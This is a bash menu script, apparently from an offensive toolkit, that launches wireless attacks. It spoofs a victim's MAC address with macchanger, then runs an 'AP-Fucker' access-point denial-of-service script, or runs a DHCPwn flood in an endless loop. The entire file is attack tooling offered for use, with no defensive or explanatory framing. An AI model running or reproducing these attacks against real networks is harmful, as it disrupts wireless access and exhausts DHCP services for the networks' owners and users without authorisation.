clear
while :
do
echo ""
echo "Wireless Attacks"
echo "--------------------------------------"
echo ""
echo "  1.- Wireless Denial of Service (AP DoS with AP-Fucker)"
echo "  2.- DHCP Flooding (DHCP DoS with DHCPwn)"
echo ""
echo "  99.- Exit"
echo "--------------------------------------"
echo ""
echo -n "Select an option [Wireless Attacks]> "
read op5
case $op5 in
1) echo "[*] Selected: Wireless DoS";
echo -n "Victim Mac Address [Wireless]> "
read mac1
echo -n "Wireless Network Interface [Wireless]> "
read i1
ifconfig $i1 down
macchanger --mac=$mac1 $i1
ifconfig $i1 up
echo "[+] Victim Mac Address Spoofed!";
echo "[*] Starting AP-Fucker Script...";
python dep/AP-Fucker.py
;;
2) echo "[*] Selected: DHCP Flood";
echo -n "Victim Mac Address [Wireless]> "
read mac2
echo -n "Network Interface [Wireless]> "
read i2
ifconfig $i2 down
macchanger --mac=$mac2 $i2
ifconfig $i2 up
echo "[+] Victim Mac Address Spoofed!";
echo "[*] Starting DHCPwn Script...";
while :
do
	python3 dep/dhcpwn.py -i $i2 flood
	sleep 1
done


;;
99) echo "[*] Exiting...";
exit 1;;
*) echo "[!] $op5 is not a valid option.";
echo "Press enter to continue...";
read foo;;
esac
done

